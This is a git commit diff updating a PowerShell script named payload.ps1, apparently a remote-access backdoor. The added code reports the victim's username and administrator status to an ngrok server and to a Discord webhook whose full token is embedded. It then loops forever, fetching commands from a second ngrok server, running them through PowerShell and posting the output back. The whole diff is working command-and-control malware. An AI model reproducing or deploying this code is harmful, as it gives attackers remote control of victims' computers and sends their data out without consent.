b26347477d20cedc71a43ce9d36cba418474bcb2
Mood56467 <100055549+Mood56467@users.noreply.github.com>
2024-03-10 11:03:45 -0700

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,3 +1,13 @@
+$webhookUri = 'https://discord.com/api/webhooks/1215498255593639996/9XYdMB4oJjrL1gyLZM1KLJK0BuQLkMQVk7CCNA0d6hcurPmMHo-spwPpdDyoZycb0Gah'
+
+$ran = Get-Random
+
+$c = $null
+
+$body = $null
+
+$notification = "all data image related will be sent here"
+
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False){
 	$check = "we are not admin"
@@ -5,32 +15,48 @@ if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administr
 	$check = "we are admin"
 }
 
-$ran = Get-Random
+try 
+{
+    $welcomeclient = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $hmal,$testadmin,$check,$userid,$ran -UseBasicParsing
+}
+catch
+{
 
-$URIREC = "192.168.2.37:80"
+    Write-Output "Server isnt active."
+}
 
-$URISEND = "192.168.2.37:4444"
+$cb = $check,$ran,$notification
 
-$hmal = "call back from "
+foreach ($item in $cb) {
+    $body += "$item`n"
+	}
 
-$hmal = whoami
-$userid = "client id is"
+$jsonBody = @{
+    'username' = $ran
+    'content' = $body
+}
 
-Invoke-WebRequest -Timeout 1 -Method Post -URI https://404611374.ngrok.io -Body $hmal,$testadmin,$check,$userid,$ran -UseBasicParsing
+	$jsonBody = $jsonBody | ConvertTo-Json
+	Invoke-RestMethod -Uri $webhookUri -Method 'post' -ContentType 'application/json' -Body $jsonBody
 
 while ($true)
 {
+
 
 	$MAIN = Invoke-WebRequest -Timeout 1 'https://serverhttp.ngrok.io' | Select-Object -Expand Content
 
 	if($MAIN -match $ran){
 		$REM = $MAIN -replace $ran, ""
 
-	$EXE = powershell /c $REM
-  
-		$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI https://404611374.ngrok.io -Body $EXE -UseBasicParsing
-
-	}else{ 	
-	}
-	sleep 0.5
+		$EXE = powershell /c $REM
+        try
+        { 
+            $Response = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $EXE -UseBasicParsing 
+        }
+        catch
+        {
+        }
+		}else{ 	
+		}
+sleep 0.5
 }
